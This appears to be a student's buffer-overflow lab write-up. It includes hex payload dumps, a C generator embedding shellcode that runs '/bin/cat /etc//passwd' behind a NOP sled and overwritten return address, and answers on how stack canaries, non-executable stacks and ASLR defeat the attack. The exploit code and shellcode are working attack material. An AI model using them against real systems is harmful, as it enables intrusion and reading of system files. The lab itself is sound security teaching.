
Task 1:
	exploit44:
		00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
		00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
		00000020: 4141 4141 4141 4141 4141 4141 0102 0304  AAAAAAAAAAAA....
		00000030: 0a00                                     ..

Task 2:
	gen_exploit_b:
		/* gen_exploit_b.c */

		#include <stdio.h>
		#include <stdlib.h>
		#include <string.h>

		char shellcode[]=
		"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64"
		"\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

		void main(int argc, char **argv) {
		  char buffer[499];
		  FILE *exploit_file;

		  /* Setup NOP sled */
		  memset(buffer, 0x90, 499);

		  /* Where should the shellcode go? */
		  memcpy(buffer + 56, shellcode, sizeof(shellcode)-1);

		  /* Also need to overwrite the return address with the location of
		     where our shellcode will be in virtual memory */
		  memset(buffer+24, 0x2c, 1);
		  memset(buffer+25, 0xf7, 1);
		  memset(buffer+26, 0xff, 1);
		  memset(buffer+27, 0xbf, 1);


		  exploit_file = fopen("./exploit_b", "w");
		  fwrite(buffer, sizeof(buffer), 1, exploit_file);
		  fclose(exploit_file);
		}

	exploit_b:
		00000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000010: 9090 9090 9090 9090 2cf7 ffbf 9090 9090  ........,.......
		00000020: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000030: 9090 9090 9090 9090 31c0 9952 682f 6361  ........1..Rh/ca
		00000040: 7468 2f62 696e 89e3 5268 7373 7764 682f  th/bin..Rhsswdh/
		00000050: 2f70 6168 2f65 7463 89e1 b00b 5251 5389  /pah/etc....RQS.
		00000060: e1cd 8090 9090 9090 9090 9090 9090 9090  ................
		00000070: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000080: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		00000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000001e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................
		000001f0: 9090 90                                  ...

	Where did you put your shellcode within your exploit file? The beginning, middle, or end? Why?
		This exploit would fill up the stack starting with small_buffer. Based on task1, I knew that there were 12 bytes between the end of small_buffer and the return_address entry, 24 bytes of offset total. Given that my shellcode was larger than 24 bytes (and that I didn't want to loop into code that would spawn infinite shells) I chose to put it after the 24+4 bytes (for the return address itself), so that it would rest somewhere after the return address entry but early enough such that it could still fit. I also aligned it to a multiple of 4, since 4 bytes == word size == instruction size. 

	If you modify lab3.c so that the size of small_buffer is 20 instead of 12, does your exploit work? It shouldn't, but why not?
		It won't work because the contents of the return address entry would be 0x90909090 instead of 0x<my_chosen_shellcode_address>. This is because the offset between small_buffer and the return address has changed, since the allocated space for small_buffer has changed.

	What change would you need to make to your exploit to make it work? Make the changes to your code and try it to verify your solution.
		lab3a: 32+12 = 12
		lab3b: 12+12 = 24
		lab3b_modded: 20+12 = 32

		So instead of setting my return address' offset to 24, I would set it to 32 to account for the 8 extra bytes allocated to small_buffer. 

Task 3:
	**** stack smashing detected ***: ./lab3b terminated 
	Segmentation fault

	What happened when you ran your attack? Why was this output displayed? Explain how the stack protector prevents your attack from succeeding.
		The OS was able to detect that I was writing over a "canary" it had placed between small_buffer and return_address. Because my write is clumsy and will overwrite it, the change in the canary was detected and the process was killed. There is no way for me to predict the canary, nor any way to avoid writing over it, given this specific vulnerability.

Task 4:
	Segmentation fault

	Answer the following questions: What happened when you ran your attack? Why was this output displayed? Explain how the non-executable stack prevents your attack from succeeding.
		The OS was able to detect that I had re-directed control flow to a non-exectuable area (the stack). Since the stack was not flagged to allow execution, the OS killed the process attempting to execute code in this region.

Task 5:
	Segmentation fault

	Answer the following questions: What happened when you ran your attack? Why was this output displayed? Explain how the non-executable stack prevents your attack from succeeding.
		My exploit relies on the hardcoded return_address+16 value to be a valid, executable stack address, so that the IP can NOP Sled its way to my shellcode. The ASLR functionality makes it possible (overwhelmingly likely) that the return_address+16 I use is not valid, since the base address for where the stack would exist is random. So, when I try to access a the page that hosts my hardcoded return_address+16, the OS detects an invalid address and throws a segmentation fault.

	It is possible to pull off a successful attack even with ASLR disabled with a well crafted exploit and a bit of luck (and maybe many tries). How is this possible? How does the NOP sled technique help?
		I assume the question disables Stack Protector and Non-exec-stack, and that it means "ASLR enabled"--especially since the NOP sled technique is mentioned. 

		As I said above, the base address for where the stack is located is randomized, so it is technically possible for your return_address+16 guess to be a perfectly valid address. If your guess happens to be correct, then the IP will eventually find its way to your shellcode.

		The NOP Sled helps by increasing the range for a valid guess. Instead of having to guess exactly where your shellcode is, as long as you guess any address on the NOP Sled, the same result is achieved (the shellcode executes).  


	



